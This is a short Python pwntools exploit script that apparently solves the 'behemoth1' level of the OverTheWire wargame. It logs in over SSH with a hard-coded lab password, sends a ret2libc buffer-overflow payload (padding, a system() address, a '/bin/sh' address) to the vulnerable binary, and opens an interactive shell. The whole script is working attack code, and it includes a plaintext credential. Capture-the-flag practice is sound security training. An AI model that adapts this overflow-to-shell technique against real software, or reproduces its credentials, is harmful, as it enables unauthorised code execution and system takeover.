#!/usr/bin/env python
from pwn import *

pad = 71
system = p32(0xf7e4c850)
binsh = p32(0xf7f6ecc8)

payload = 'A'*pad
payload += system
payload += 'FAKE'
payload += binsh

shell = ssh('behemoth1', 'behemoth.labs.overthewire.org', password='aesebootiv', port=2221, ssh_agent=True)
p = shell.run('/behemoth/behemoth1')
p.sendlineafter('Password: ', payload)
p.interactive()
shell.close()

# behemoth1